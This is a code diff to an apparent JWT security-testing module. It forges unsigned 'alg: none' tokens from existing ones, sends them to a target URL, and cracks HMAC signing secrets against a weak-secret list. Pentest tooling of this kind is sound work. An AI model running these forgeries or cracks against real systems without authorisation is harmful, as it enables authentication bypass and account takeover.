@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import json
 import base64
 import hashlib
@@ -12,7 +11,6 @@ try:
 except ImportError:
     pyjwt = None
     HAS_PYJWT = False
-
 
 
 WEAK_SECRETS = [
@@ -34,17 +32,14 @@ WEAK_SECRETS = [
 
 
 def _base64url_encode(data):
-    """Base64url encode without padding."""
     if isinstance(data, str):
         data = data.encode("utf-8")
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")
 
 
 def _base64url_decode(data):
-    """Base64url decode with padding fix."""
     if isinstance(data, str):
         data = data.encode("utf-8")
-    # Add padding if needed
     padding = 4 - len(data) % 4
     if padding != 4:
         data += b"=" * padding
@@ -64,18 +59,12 @@ def _decode_jwt_parts(jwt_token):
     except Exception:
         return None, None
 
-
 def extract_jwts_from_results(all_secrets):
-    """
-    Look through found secrets for JWT-type tokens.
-    Returns list of JWT token strings.
-    """
     jwt_tokens = []
 
     for secret in all_secrets:
         secret_type = secret.get("type", "").lower()
         value = secret.get("value", "")
-
 
         if "jwt" in secret_type or "bearer" in secret_type:
             if value and value.count(".") == 2 and value.startswith("ey"):
@@ -89,7 +78,6 @@ def test_jwt_none_algorithm(jwt_token, url, headers=None, timeout=5):
     if header is None or payload is None:
         return False
 
-
     forged_header = {"alg": "none", "typ": "JWT"}
     forged_token = (
         _base64url_encode(json.dumps(forged_header, separators=(",", ":")))
@@ -97,7 +85,6 @@ def test_jwt_none_algorithm(jwt_token, url, headers=None, timeout=5):
         + _base64url_encode(json.dumps(payload, separators=(",", ":")))
         + "."
     )
-
 
     test_headers = dict(headers) if headers else {}
     test_headers["Authorization"] = f"Bearer {forged_token}"
@@ -124,32 +111,28 @@ def test_jwt_weak_secret(jwt_token, url=None, headers=None, timeout=5):
     if len(parts) != 3:
         return None
 
+
     signing_input = f"{parts[0]}.{parts[1]}"
     original_signature = parts[2]
 
+    alg = header.get("alg", "HS256").upper()
+    if alg == "HS384":
+        digest_fn = hashlib.sha384
+    elif alg == "HS512":
+        digest_fn = hashlib.sha512
+    else:
+        digest_fn = hashlib.sha256
+
     for weak_secret in WEAK_SECRETS:
         try:
-            if HAS_PYJWT:
-
-                try:
-                    test_token = pyjwt.encode(payload, weak_secret, algorithm="HS256")
-                    if isinstance(test_token, bytes):
-                        test_token = test_token.decode("utf-8")
-                    test_parts = test_token.split(".")
-                    if len(test_parts) == 3 and test_parts[2] == original_signature:
-                        return weak_secret
-                except Exception:
-                    pass
-            else:
-
-                sig = hmac.new(
-                    weak_secret.encode("utf-8"),
-                    signing_input.encode("utf-8"),
-                    hashlib.sha256,
-                ).digest()
-                computed_sig = _base64url_encode(sig)
-                if computed_sig == original_signature:
-                    return weak_secret
+            sig = hmac.new(
+                weak_secret.encode("utf-8"),
+                signing_input.encode("utf-8"),
+                digest_fn,
+            ).digest()
+            computed_sig = _base64url_encode(sig)
+            if computed_sig == original_signature:
+                return weak_secret
         except Exception:
             continue
 
